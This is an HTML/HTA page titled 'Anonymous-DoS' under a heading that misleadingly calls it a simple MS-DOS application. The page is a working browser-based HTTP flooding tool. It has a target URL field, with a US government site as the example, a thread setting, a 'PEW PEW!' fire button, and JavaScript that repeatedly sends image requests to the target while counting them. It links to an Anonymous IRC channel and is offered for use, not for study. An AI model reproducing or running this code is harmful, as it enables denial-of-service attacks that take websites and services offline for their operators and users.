# MS-DOS
Simple DOS application in your web browser
NOTICE: This is currently in Alpha testing so it may be a little buggy.

<!DOCTYPE HTML> 
<html> 
<head>
<script type="text/javascript">
    window.resizeTo(650,500);
</script>
<hta:application id="oMyApp"
windowstate="normal">
<title>Anonymous-DoS</title> 
</head> 
<body style="background-color:black; color:red;"> 


<div style="position:absolute; width:100%; height:100%; left: 9px; top: 20px;">

<div style="width:242px; height:143px; position:absolute;left:20px; top:0px"> 
<fieldset style="width:100%; height:100%;"> 
<legend>1. Target</legend> 
<label>URL: <br /> <input id="targetURL" style="width:90%;" /></label> 
<font size="2">EX.:<span style="color: #FFFFFF"> 
http://www.justice.gov</span></font> 
<small>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
anonops irc</small><font size="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<a target="_blank" href="http://webchat.anonops.com">webchat.anonops.com&nbsp; 
</a>
</div> 


<div style="width:240px; height:100px; position:absolute; left:300px;"> 
<fieldset style="width:100%; height:100%;"> 
<legend>3. FIRE!</legend> 
<button id="fireButton" style="background-color:darkred; border-color:#FFF; color:#FFF; width:240px; height:70px;">
PEW PEW!</button> 
</fieldset> 
</div> 


<div style="width:240px; height:160px; position:absolute; left:20px; top:150px;"> 
<fieldset style="width:100%; height:100%;"> 
<legend>2. Options</legend> 
<label>threads: <input style="width:40px;" id="rps" value="10" /></label><br /> 

message:<label>: <br /><input style="width:90%;" id="message" value="" /></label> 
</fieldset> 
</div> 

<div style="width:240px; height:160px; position:absolute; left:300px; top:150px;"> 
<fieldset style="width:100%; height:100%;"> 
<legend>Status of attack</legend> 
<dl> 
<dt>Total requests:</dt> 
<dd id="requestedCtr">0</dd> 
<dt style="opacity: 0.5">Succeeded requests:</dt> 
<dd style="opacity: 0.5" id="succeededCtr">0</dd> 

<dt style="opacity: 0.5">Failed requests:</dt> 
<dd style="opacity: 0.5" id="failedCtr">0</dd> 
</dl> 
</fieldset> 
</div> 

<div style="width:100%; height:49px; font-size:14px; position:absolute; left:200px; top:350px;"> 
We are anonymous<br>
We are legion<br>
We do not forgive<br>
We do not forget<br>
<p>


<br> 
</div> 

</div> 
<script> 
(function () { 

var fireInterval; 
var isFiring = false; 

var requestedCtrNode = document.getElementById("requestedCtr" ) , 
succeededCtrNode = document.getElementById("succeededCtr" ) , 
failedCtrNode = document.getElementById("failedCtr" ) , 
targetURLNode = document.getElementById("targetURL" ) , 
fireButton = document.getElementById("fireButton" ) , 
messageNode = document.getElementById("message" ) , 
rpsNode = document.getElementById("rps" ) , 
timeoutNode = document.getElementById("timeout" ) ; 

var targetURL = targetURLNode.value; 
targetURLNode.onchange = function () { 
targetURL = this.value; 
}; 

var requestsHT = {}; // requests hash table, may come in handy later 

var requestedCtr = 0, 
succeededCtr = 0, 
failedCtr = 0; 

var makeHttpRequest = function () { 

if (requestedCtr > failedCtr + succeededCtr + 1000) { //Allow no more than 1000 hung requests 
return; 
}; 

var rID =Number(new Date()); 
var img = new Image(); 
img.onerror = function () { onFail(rID); }; 
img.onabort = function () { onFail(rID); }; 
img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods 

img.setAttribute("src", targetURL + "?id=" + rID + "&msg=" + messageNode.value); 
requestsHT[rID] = img; 
onRequest(rID); 
}; 

var onRequest = function (rID) { 
requestedCtr++; 
requestedCtrNode.innerHTML = requestedCtr; 
}; 

var onComplete = function (rID) { 
delete requestsHT[rID]; 
}; 

var onFail = function (rID) { 
// failedCtr++; 
//failedCtrNode.innerHTML = failedCtr; 

succeededCtr++; //Seems like the url will always fail it it isn't an image 
succeededCtrNode.innerHTML = succeededCtr; 


delete requestsHT[rID]; // we can't keep it forever or it would blow up the browser 
}; 

var onSuccess = function (rID) { 
succeededCtr++; 
succeededCtrNode.innerHTML = succeededCtr; 
delete requestsHT[rID]; 
}; 

fireButton.onclick = function () { 
if (isFiring) { 
clearInterval(fireInterval); 

isFiring = false; 
this.innerHTML = "PEW PEW!"; 
} else { 
isFiring = true; 
this.innerHTML = "Stop flooding"; 

fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rpsNode.value) | 0)); 
} 
}; 

})(); 
</script>
</body> 
</html>
